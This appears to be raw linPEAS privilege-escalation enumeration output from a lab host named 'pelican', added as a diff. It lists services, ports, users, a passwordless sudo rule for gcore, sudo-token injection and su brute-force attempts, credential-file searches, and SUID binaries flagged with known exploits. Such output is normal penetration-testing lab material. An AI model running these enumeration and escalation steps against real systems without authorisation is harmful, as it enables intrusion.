+:1.16                                      485 cups-browsed    root             :1.16         cups-browsed.service      -          -
+:1.2                                       452 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+:1.20                                      532 lightdm         root             :1.20         lightdm.service           -          -
+:1.224                                    1533 busctl          charles          :1.224        exhibitor.service         -          -
+:1.26                                      560 Xorg            root             :1.26         lightdm.service           -          -
+:1.28                                      642 cupsd           root             :1.28         cups.service              -          -
+:1.29                                      642 cupsd           root             :1.29         cups.service              -          -
+:1.3                                         1 systemd         root             :1.3          init.scope                -          -
+:1.31                                      653 lightdm         root             :1.31         session-c1.scope          c1         -
+:1.37                                      657 systemd         lightdm          :1.37         user@112.service          -          -
+:1.47                                     1318 smbd            root             :1.47         smbd.service              -          -
+:1.5                                       467 avahi-daemon    avahi            :1.5          avahi-daemon.service      -          -
+:1.6                                       460 udisksd         root             :1.6          udisks2.service           -          -
+:1.7                                       443 ModemManager    root             :1.7          ModemManager.service      -          -
+:1.8                                       444 systemd-logind  root             :1.8          systemd-logind.service    -          -
+fi.epitest.hostap.WPASupplicant            452 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+fi.w1.wpa_supplicant1                      452 wpa_supplicant  root             :1.2          wpa_supplicant.service    -          -
+org.freedesktop.Avahi                      467 avahi-daemon    avahi            :1.5          avahi-daemon.service      -          -
+org.freedesktop.ColorManager                 - -               -                (activatable) -                         -
+org.freedesktop.DBus                         1 systemd         root             -             init.scope                -          -
+org.freedesktop.DisplayManager             532 lightdm         root             :1.20         lightdm.service           -          -
+org.freedesktop.ModemManager1              443 ModemManager    root             :1.7          ModemManager.service      -          -
+org.freedesktop.NetworkManager             461 NetworkManager  root             :1.14         NetworkManager.service    -          -
+org.freedesktop.PackageKit                   - -               -                (activatable) -                         -
+org.freedesktop.PolicyKit1                 488 polkitd         root             :1.11         polkit.service            -          -
+org.freedesktop.RealtimeKit1                 - -               -                (activatable) -                         -
+org.freedesktop.UDisks2                    460 udisksd         root             :1.6          udisks2.service           -          -
+org.freedesktop.UPower                       - -               -                (activatable) -                         -
+org.freedesktop.hostname1                    - -               -                (activatable) -                         -
+org.freedesktop.locale1                      - -               -                (activatable) -                         -
+org.freedesktop.login1                     444 systemd-logind  root             :1.8          systemd-logind.service    -          -
+org.freedesktop.network1                     - -               -                (activatable) -                         -
+org.freedesktop.nm_dispatcher                - -               -                (activatable) -                         -
+org.freedesktop.resolve1                     - -               -                (activatable) -                         -
+org.freedesktop.systemd1                     1 systemd         root             :1.3          init.scope                -          -
+org.freedesktop.timedate1                    - -               -                (activatable) -                         -
+org.freedesktop.timesync1                  315 systemd-timesyn systemd-timesync :1.0          systemd-timesyncd.service -          -
+org.opensuse.CupsPkHelper.Mechanism          - -               -                (activatable) -                         -
+
+
+════════════════════════════════════╣ Network Information ╠════════════════════════════════════
+╔══════════╣ Hostname, hosts and DNS
+pelican
+127.0.0.1       localhost
+127.0.1.1       pelican
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+nameserver 192.168.248.254
+
+╔══════════╣ Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+╔══════════╣ Interfaces
+default         0.0.0.0
+loopback        127.0.0.0
+link-local      169.254.0.0
+
+ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.248.98  netmask 255.255.255.0  broadcast 192.168.248.255
+        ether 00:50:56:bf:76:87  txqueuelen 1000  (Ethernet)
+        RX packets 88016  bytes 6487032 (6.1 MiB)
+        RX errors 0  dropped 8  overruns 0  frame 0
+        TX packets 89141  bytes 8288365 (7.9 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 67182  bytes 4212988 (4.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 67182  bytes 4212988 (4.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+
+╔══════════╣ Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+default         192.168.248.254 0.0.0.0         UG    100    0        0 ens192
+192.168.248.0   0.0.0.0         255.255.255.0   U     100    0        0 ens192
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.248.254          ether   00:50:56:9f:d0:96   C                     ens192
+
+╔══════════╣ Iptables rules
+iptables rules Not Found
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:2181            0.0.0.0:*               LISTEN      24514/java
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      504/java
+tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:631             0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:35099           0.0.0.0:*               LISTEN      24514/java
+
+╔══════════╣ Can I sniff with tcpdump?
+No
+
+╔══════════╣ Internet Access?
+Ping is not available
+DNS not available
+Port 443 is not accessible
+Port 80 is not accessible
+
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=1000(charles) gid=1000(charles) groups=1000(charles)
+
+╔══════════╣ Do I have PGP keys?
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+╔══════════╣ Clipboard or highlighted text?
+xsel and xclip Not Found
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+Matching Defaults entries for charles on pelican:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User charles may run the following commands on pelican:
+    (ALL) NOPASSWD: /usr/bin/gcore
+
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb was found in PATH
+Checking for sudo tokens in other shells owned by current user
+Injecting process 24475 -> bash
+Injecting process 24478 -> bash
+Injecting process 24479 -> bash
+Injecting process 24765 -> bash
+The escalation didn't work... (try again later?)
+
+╔══════════╣ Checking doas.conf
+/etc/doas.conf Not Found
+
+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[Configuration]
+AdminIdentities=unix-user:0
+[Configuration]
+AdminIdentities=unix-group:sudo
+
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ Users with console
+charles:x:1000:1000::/home/charles:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(charles) gid=1000(charles) groups=1000(charles)
+uid=100(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=101(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
+uid=102(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
+uid=103(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
+uid=104(messagebus) gid=110(messagebus) groups=110(messagebus)
+uid=105(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
+uid=106(usbmux) gid=46(plugdev) groups=46(plugdev)
+uid=107(rtkit) gid=111(rtkit) groups=111(rtkit)
+uid=108(pulse) gid=114(pulse) groups=114(pulse),29(audio)
+uid=109(speech-dispatcher) gid=29(audio) groups=29(audio)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=110(avahi) gid=117(avahi) groups=117(avahi)
+uid=111(saned) gid=118(saned) groups=118(saned),113(scanner)
+uid=112(lightdm) gid=119(lightdm) groups=119(lightdm)
+uid=113(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=114(colord) gid=122(colord) groups=122(colord)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=6(man) gid=12(man) groups=12(man)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=999(systemd-coredump) gid=999(systemd-coredump) groups=999(systemd-coredump)
+uid=9(news) gid=9(news) groups=9(news)
+
+╔══════════╣ Login now
+ 11:48:10 up  1:42,  0 users,  load average: 0.27, 0.18, 0.09
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+╔══════════╣ Last logons
+reboot   system boot  Wed Oct 28 10:21:41 2020   still running                         0.0.0.0
+
+wtmp begins Wed Oct 28 10:21:41 2020
+
+╔══════════╣ Last time logon each user
+Username         Port     From             Latest
+
+╔══════════╣ Password policy
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+ENCRYPT_METHOD SHA512
+
+╔══════════╣ Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds
+
+  Bruteforcing user root...
+  Bruteforcing user charles...
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+
+════════════════════════════════════╣ Software Information ╠════════════════════════════════════
+╔══════════╣ MySQL version
+mysql Not Found
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No
+═╣ MySQL connection using root/NOPASS ................. No
+╔══════════╣ Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf
+[client-server]
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mariadb.conf.d/
+
+╔══════════╣ Analizing PostgreSQL Files (limit 70)
+Version: psql Not Found
+
+pgadmin*.db Not Found
+
+pg_hba.conf Not Found
+
+postgresql.conf Not Found
+
+pgsql.conf Not Found
+
+═╣ PostgreSQL connection to template0 using postgres/NOPASS ........ No
+═╣ PostgreSQL connection to template1 using postgres/NOPASS ........ No
+═╣ PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+═╣ PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+╔══════════╣ Analizing Mongo Files (limit 70)
+Version: mongo Not Found
+mongod Not Found
+
+mongod*.conf Not Found
+
+╔══════════╣ Analizing Apache Files (limit 70)
+Version: apache2 Not Found
+httpd Not Found
+
+══╣ PHP exec extensions
+drwxr-xr-x 2 root root 4096 Sep 10  2020 /etc/nginx/sites-enabled
+
+
+000-default Not Found
+
+╔══════════╣ Analizing Tomcat Files (limit 70)
+tomcat-users.xml Not Found
+
+╔══════════╣ Analizing FastCGI Files (limit 70)
+-rw-r--r-- 1 root root 1007 Aug 24  2020 /etc/nginx/fastcgi_params
+
+╔══════════╣ Analizing Http_conf Files (limit 70)
+httpd.conf Not Found
+
+╔══════════╣ Analizing Htpasswd Files (limit 70)
+.htpasswd Not Found
+
+╔══════════╣ Analizing PHPCookies Files (limit 70)
+/var/lib/php/sessions Not Found
+sess_* Not Found
+
+╔══════════╣ Analizing Wordpress Files (limit 70)
+wp-config.php Not Found
+
+╔══════════╣ Analizing Drupal Files (limit 70)
+settings.php Not Found
+
+╔══════════╣ Analizing Moodle Files (limit 70)
+config.php Not Found
+
+╔══════════╣ Analizing Supervisord Files (limit 70)
+supervisord.conf Not Found
+
+╔══════════╣ Analizing Cesi Files (limit 70)
+cesi.conf Not Found
+
+╔══════════╣ Analizing Rsync Files (limit 70)
+rsyncd.conf Not Found
+
+rsyncd.secrets Not Found
+
+╔══════════╣ Analizing Hostapd Files (limit 70)
+hostapd.conf Not Found
+
+╔══════════╣ Searching wifi conns file
+/etc/NetworkManager/system-connections/ethernet-ens192.nmconnection
+
+╔══════════╣ Analizing Anaconda-ks Files (limit 70)
+anaconda-ks.cfg Not Found
+
+╔══════════╣ Analizing VNC Files (limit 70)
+.vnc Not Found
+
+*vnc*.c*nf* Not Found
+
+*vnc*.ini Not Found
+
+*vnc*.txt Not Found
+
+*vnc*.xml Not Found
+
+╔══════════╣ Analizing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /etc/ldap
+
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /usr/share/doc/tcllib/examples/ldap
+
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /usr/share/tcltk/tcllib1.19/ldap
+
+
+╔══════════╣ Analizing Open VPN Files (limit 70)
+*.ovpn Not Found
+
+╔══════════╣ Searching ssl/ssh files
+Port 22
+Port 2222
+PermitRootLogin no
+ChallengeResponseAuthentication no
+UsePAM yes
+══╣ Some certificates were found (out limited):
+
+26910PSTORAGE_CERTSBIN
+
+══╣ Some home ssh config file was found
+/usr/share/openssh/sshd_config
+ChallengeResponseAuthentication no
+UsePAM yes
+X11Forwarding yes
+PrintMotd no
+AcceptEnv LANG LC_*
+Subsystem       sftp    /usr/lib/openssh/sftp-server
+/usr/share/openssh/sshd_config.md5sum
+0d06fc337cee10609d4833dc88df740f
+10dc68360f6658910a98a051273de22c
+11f9e107b4d13bbcabe7f8e8da734371
+16c827adcff44efaca05ec5eea6383d7
+2eeff28468576c3f2e538314e177687b
+386c8b9079625b78f6d624ae506958ae
+38fc7b31b3e3078848f0eec457d3e050
+395c5e13801f9b4f17c2cb54aa634fbd
+423d5796cee663af2d0f24c4d520b578
+42be2cb5b64bc91443b2e46969d2d539
+42cd8b7c5ea9e440d3efa50b9a1bb444
+4f56ca8d0b5dfdaeb732becd3292ce5d
+54998a682a97af8449e9de0316eacf1d
+5c0bdc1735accbdc062381149937ec4a
+6357b54acf8e089c57544e06d1bbec53
+6a621d8bc448987e5a8a613c40307a4c
+702a79962e60aa17c6d3df742e8ec670
+7a69eff91ec92b4e065b8dd8846366b2
+7c60e22f183b6219c684f15ce24153fd
+8304e780c43d4a606f695c8965f48299
+8b9e70ee87f4b822714e2ed7af5b70dc
+8caefdd9e251b7cc1baa37874149a870
+90baeb1c778464d2da610f8268939719
+962a382e51f43f80109131838ca326ba
+96eaf22faba705a37905282f6ad69d64
+9cb6cd83be1c21f73476be629b163c01
+a07a9865cd33b85a1426cd67954c6fa0
+ae1e844b43986e2a964cf84f46b50c5b
+b516afa5a1e298f4cd00952b36dd623f
+b69fc974ee9b5a111bd473ef54cdd232
+ba9c3f808c811d6f944ad10a508c4767
+bccf9af9c7027afd0895d8ff8e02761a
+bd3a2b95f8b4b180eed707794ad81e4d
+c34586b56496f81a10615c002685fc74
+c47555a21189a6b703d2c5d37d2c50ed
+cac079e87c0ae0d77eafc9b285e36348
+d224f92823483333432974f63cb6dc66
+d50ef9ef2aa51cb9f808f6a776260c0a
+e0029e1e9871d4d2b673ee6d70a38614
+e086e7eb521ccc5776371b2e198f0702
+e101f74dc7381527e9aefa1f78b01a7f
+e24f749808133a27d94fda84a89bb27b
+ec16c3dd0203f13885d74ce529719fda
+efcff5380823d4e3f5039620c2e08459
+f58056370a64dbd2017d7486421c281d
+fe396d52df77f1fbf710591d4dbf3311
+
+══╣ /etc/hosts.allow file found, trying to read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+
+╔══════════╣ Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+╔══════════╣ NFS exports?
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+╔══════════╣ Searching kerberos conf files and tickets
+╚ https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+-rw-r--r-- 1 root root 89 Jul 12  2018 /usr/share/samba/setup/krb5.conf
+tickets kerberos Not Found
+klist Not Found
+
+╔══════════╣ Analizing Knockd Files (limit 70)
+*knockd* Not Found
+
+╔══════════╣ Analizing Kibana Files (limit 70)
+kibana.y*ml Not Found
+
+╔══════════╣ Analizing Elasticsearch Files (limit 70)
+The version is
+elasticsearch.y*ml Not Found
+
+╔══════════╣ Searching logstash files
+ Not Found
+
+╔══════════╣ Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+╔══════════╣ Searching AD cached hashes
+-rw------- 1 root root 430080 Sep 10  2020 /var/lib/samba/private/secrets.tdb
+
+╔══════════╣ Searching screen sessions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+╔══════════╣ Searching tmux sessions
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+╔══════════╣ Analizing CouchDB Files (limit 70)
+couchdb Not Found
+
+╔══════════╣ Analizing Redis Files (limit 70)
+redis.conf Not Found
+
+╔══════════╣ Searching dovecot files
+dovecot credentials Not Found
+
+╔══════════╣ Analizing Mosquitto Files (limit 70)
+mosquitto.conf Not Found
+
+╔══════════╣ Analizing Neo4j Files (limit 70)
+neo4j Not Found
+
+╔══════════╣ Analizing Cloud credentials Files (limit 70)
+credentials Not Found
+
+credentials.db Not Found
+
+legacy_credentials.db Not Found
+
+access_tokens.db Not Found
+
+access_tokens.json Not Found
+
+accessTokens.json Not Found
+
+azureProfile.json Not Found
+
+TokenCache.dat Not Found
+
+AzureRMContext.json Not Found
+
+.bluemix Not Found
+
+╔══════════╣ Analizing Cloud-Init Files (limit 70)
+cloud.cfg Not Found
+
+╔══════════╣ Analizing CloudFlare Files (limit 70)
+.cloudflared Not Found
+
+╔══════════╣ Analizing Erlang Files (limit 70)
+.erlang.cookie Not Found
+
+╔══════════╣ Analizing GMV Auth Files (limit 70)
+gvm-tools.conf Not Found
+
+╔══════════╣ Analizing IPSec Files (limit 70)
+ipsec.secrets Not Found
+
+ipsec.conf Not Found
+
+╔══════════╣ Analizing IRSSI Files (limit 70)
+.irssi Not Found
+
+╔══════════╣ Analizing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /usr/share/keyrings
+
+*.keyring Not Found
+
+*.keystore Not Found
+
+-rw-rw-r-- 1 charles charles 1363 Feb 20  2014 /opt/zookeeper/src/contrib/rest/conf/keys/rest.jks
+
+╔══════════╣ Analizing Filezilla Files (limit 70)
+filelliza Not Found
+
+filezilla.xml Not Found
+
+╔══════════╣ Analizing Backup Manager Files (limit 70)
+storage.php Not Found
+
+database.php Not Found
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+╔══════════╣ Searching GitLab related files
+
+
+╔══════════╣ Analizing Github Files (limit 70)
+.github Not Found
+
+.gitconfig Not Found
+
+.git-credentials Not Found
+
+.git Not Found
+
+╔══════════╣ Analizing Svn Files (limit 70)
+.svn Not Found
+
+╔══════════╣ Analizing PGP-GPG Files (limit 70)
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+*.pgp Not Found
+
+-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root 5106 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg
+-rw-r--r-- 1 root root 5115 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg
+-rw-r--r-- 1 root root 2763 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg
+-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
+-rw-r--r-- 1 root root 3267 Aug 22  2019 /usr/share/gnupg/distsigkey.gpg
+-rw-r--r-- 1 root root 8132 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-automatic.gpg
+-rw-r--r-- 1 root root 8141 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
+-rw-r--r-- 1 root root 2332 Apr 23  2019 /usr/share/keyrings/debian-archive-buster-stable.gpg
+-rw-r--r-- 1 root root 5106 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-automatic.gpg
+-rw-r--r-- 1 root root 5115 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-security-automatic.gpg
+-rw-r--r-- 1 root root 2763 Apr 23  2019 /usr/share/keyrings/debian-archive-jessie-stable.gpg
+-rw-r--r-- 1 root root 48747 Apr 23  2019 /usr/share/keyrings/debian-archive-keyring.gpg
+-rw-r--r-- 1 root root 23889 Apr 23  2019 /usr/share/keyrings/debian-archive-removed-keys.gpg
+-rw-r--r-- 1 root root 7443 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
+-rw-r--r-- 1 root root 7452 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
+-rw-r--r-- 1 root root 2263 Apr 23  2019 /usr/share/keyrings/debian-archive-stretch-stable.gpg
+
+*.gnupg Not Found
+
+╔══════════╣ Analizing Cache Vi Files (limit 70)
+*.swp Not Found
+
+*.viminfo Not Found
+
+╔══════════╣ Checking if containerd(ctr) is available
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
+
+╔══════════╣ Checking if runc is available
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+
+╔══════════╣ Searching docker files (limit 70)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
+
+╔══════════╣ Analizing Firefox Files (limit 70)
+.mozilla Not Found
+
+╔══════════╣ Analizing Chrome Files (limit 70)
+google-chrome Not Found
+
+╔══════════╣ Analizing Autologin Files (limit 70)
+autologin Not Found
+
+autologin.conf Not Found
+
+╔══════════╣ S/Key authentication
+
+╔══════════╣ YubiKey authentication
+
+╔══════════╣ Passwords inside pam.d
+
+╔══════════╣ Analizing SNMP Files (limit 70)
+snmpd.conf Not Found
+
+╔══════════╣ Analizing Pypirc Files (limit 70)
+.pypirc Not Found
+
+╔══════════╣ Analizing Ldaprc Files (limit 70)
+.ldaprc Not Found
+
+╔══════════╣ Analizing Env Files (limit 70)
+.env Not Found
+
+╔══════════╣ Analizing Msmtprc Files (limit 70)
+.msmtprc Not Found
+
+╔══════════╣ Analizing Keepass Files (limit 70)
+*.kdbx Not Found
+
+KeePass.config* Not Found
+
+KeePass.ini Not Found
+
+KeePass.enforced* Not Found
+
+╔══════════╣ Analizing FTP Files (limit 70)
+*.ftpconfig Not Found
+
+ffftp.ini Not Found
+
+ftp.ini Not Found
+
+ftp.config Not Found
+
+ws_ftp.ini Not Found
+
+╔══════════╣ Analizing Interesting logs Files (limit 70)
+-rw-r--r-- 1 root root 6608 Jun 18 11:12 /var/log/nginx/access.log
+
+-rw-r--r-- 1 root root 0 Oct 28  2020 /var/log/nginx/error.log
+
+╔══════════╣ Analizing Windows Files Files (limit 70)
+unattend.inf Not Found
+
+*.rdg Not Found
+
+AppEvent.Evt Not Found
+
+ConsoleHost_history.txt Not Found
+
+FreeSSHDservice.ini Not Found
+
+NetSetup.log Not Found
+
+Ntds.dit Not Found
+
+RDCMan.settings Not Found
+
+SAM Not Found
+
+SYSTEM Not Found
+
+SecEvent.Evt Not Found
+
+appcmd.exe Not Found
+
+bash.exe Not Found
+
+datasources.xml Not Found
+
+default.sav Not Found
+
+drives.xml Not Found
+
+groups.xml Not Found
+
+https-xampp.conf Not Found
+
+https.conf Not Found
+
+iis6.log Not Found
+
+index.dat Not Found
+
+lrwxrwxrwx 1 root root 22 Sep  9  2020 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
+lrwxrwxrwx 1 root root 24 Sep  9  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
+-rw-r--r-- 1 root root 83 Sep  9  2020 /var/lib/dpkg/alternatives/my.cnf
+
+my.ini Not Found
+
+ntuser.dat Not Found
+
+pagefile.sys Not Found
+
+php.ini Not Found
+
+printers.xml Not Found
+
+recentservers.xml Not Found
+
+scclient.exe Not Found
+
+scheduledtasks.xml Not Found
+
+drwxr-xr-x 3 root root 4096 Sep  9  2020 /etc/java-11-openjdk/security
+drwxr-xr-x 3 root root 4096 Sep  9  2020 /etc/java/security
+drwxr-xr-x 4 root root 4096 Sep  9  2020 /etc/security
+drwxr-xr-x 3 root root 4096 Sep  9  2020 /usr/lib/jvm/java-11-openjdk-amd64/conf/security
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /usr/lib/jvm/java-11-openjdk-amd64/lib/security
+drwxr-xr-x 2 root root 4096 Sep  9  2020 /usr/lib/x86_64-linux-gnu/security
+
+security.sav Not Found
+
+server.xml Not Found
+
+services.xml Not Found
+
+setupinfo Not Found
+
+setupinfo.bak Not Found
+
+sitemanager.xml Not Found
+
+sites.ini Not Found
+
+software Not Found
+
+software.sav Not Found
+
+sysprep.inf Not Found
+
+sysprep.xml Not Found
+
+system.sav Not Found
+
+unattend.txt Not Found
+
+unattend.xml Not Found
+
+unattended.xml Not Found
+
+wcx_ftp.ini Not Found
+
+web*.config Not Found
+
+winscp.ini Not Found
+
+wsl.exe Not Found
+
+╔══════════╣ Analizing Other Interesting Files Files (limit 70)
+-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc
+-rw-r--r-- 1 charles charles 3526 Apr 18  2019 /home/charles/.bashrc
+
+.google_authenticator Not Found
+
+hosts.equiv Not Found
+
+.lesshst Not Found
+
+.plan Not Found
+
+-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile
+-rw-r--r-- 1 charles charles 807 Apr 18  2019 /home/charles/.profile
+
+.recently-used.xbel Not Found
+
+.rhosts Not Found
+
+.sudo_as_admin_successful Not Found
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strace Not Found
+-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su
+-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root        19K Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+-rwsr-xr-x 1 root root        23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+-rwsr-xr-x 1 root root        55K Mar  6  2019 /usr/bin/bwrap
+-rwsr-xr-x 1 root root       151K Mar 21  2019 /usr/bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root       154K Feb  2  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-- 1 root dip        378K Feb 20  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root root        35K Apr 22  2020 /usr/bin/fusermount
+-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-sr-x 1 root root        15K Aug 27  2020 /usr/lib/xorg/Xorg.wrap
